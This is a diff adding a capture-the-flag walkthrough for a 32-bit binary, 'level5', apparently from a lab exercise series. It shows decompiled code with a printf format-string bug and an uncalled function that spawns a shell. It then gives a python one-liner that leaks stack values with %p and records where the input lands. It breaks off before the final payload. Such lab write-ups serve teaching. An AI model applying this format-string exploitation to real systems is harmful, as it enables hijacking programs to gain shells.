@@ -1,0 +1,31 @@
+scp -P 4242 level5@10.11.200.132:/home/user/level5/level5 .
+
+/--------------------------------------------------------/
+    int32_t main(int32_t argc, char** argv, char** envp) __noreturn
+        0804850a  n()
+        0804850a  noreturn
+
+    int32_t n() __noreturn
+        080484e5  void var_20c
+        080484e5  fgets(&var_20c, 512, *stdin)
+        080484f3  printf(&var_20c)
+        080484ff  exit(status: 1)
+        080484ff  noreturn
+
+    int32_t o() __noreturn
+        080484b1  system(0x80485f0)  {"/bin/sh"}        ## our target address
+        080484bd  _exit(status: 1)
+        080484bd  noreturn
+
+/--------------------------------------------------------/
+
+    Main function calls n(). There is a function o() which is never called.
+
+/--------------------------------------------------------/
+
+python -c 'print "AAAA" + " %p"*30 ' > /dev/shm/memoryfinder ; cat /dev/shm/memoryfinder - 1| ./level5
+
+x041 found in 4th parameter
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
+
+python -c 
